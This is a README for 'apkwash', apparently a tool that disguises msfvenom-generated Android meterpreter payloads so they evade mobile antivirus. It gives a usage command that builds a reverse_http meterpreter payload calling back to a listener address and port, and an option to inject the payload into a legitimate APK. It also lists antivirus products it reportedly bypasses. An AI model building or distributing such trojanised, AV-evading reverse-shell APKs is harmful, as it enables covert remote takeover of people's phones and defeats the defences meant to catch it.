# apkwash
Android APK Antivirus evasion for msfvenom generated payloads.
<br><br>
<b> -- Please do not upload "washed" files to VirusTotal.com -- </b><br>
<br>
<br>
<b> Tested on Kali linux rolling. </b><br>
<br>
<br>
<b>Setup:</b><br>
apt-get update && apt-get upgrade<br>
chmod +x apkwash<br>
mv apkwash /usr/local/bin/.<br>
<br>
<b>On first run:</b><br>
-Downloads and places apktool.jar in the user's /usr/local/bin directory<br>
-Generates debug keystore for signing. Places it in ~/.android/<br>
<br>
<b>Usage:</b><br>
apktool -p android/meterpreter/reverse_http LHOST=192.168.1.40 LPORT=1337 -o \<payload>.apk<br>
<br>
<b>Input Options:</b><br>
-p | --payload : (Default: android/meterpreter/reverse_https) This sets the payload to be generated by msfvenom.<br>
-o | --output : (Default: payload.apk) This sets the name of the APK created as well as the output filename.<br>
-x | --original : (MSFVenom -x) Input APK to inject the payload into.<br>
-x | --newkey : For auto-removing debug key to allow the creation of a new key within the script<br>
-v | --verbose : Don't mask output of commands<br>
-h | --help : Help information<br>
<br>
<b>Output:</b><br>
\<payload>.apk & \<payload>.listener<br>
<br>
<b>Antivirus detection:</b><br>
0/35 on nodistribute - 20Mar17<br>
Verified for AVG mobile<br>
Verified for Kaspersky mobile<br>
Verified for Lookout<br>
FLAGGED BY AVAST! -- signature bypass coming soon. Haven't spent any time on this<br>
<br>
<b>Modifiations:</b><br>
Feel free to open the script and make improvements. This script basically utilizes APKTool to open the package, uses sed to replace strings that flag AV, recompiles, then signs.<br>
<br>
<br>
<b>Files:</b><br>
/tmp/payload    (Main files to review: AndroidManifest.xml and the smali files)
<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload directory to see the file structure that was compiled.<br><br><br>
<b>If you are seeing other "Payload".smali files in /tmp/payload/smali/com/var1/var2/ then be sure you have an updated system. I have found an older msfvenom version output a different payload that will be flagged by AVG (1/35 on nodistribute). Just making sure you are completely updated should resolve this.</b>
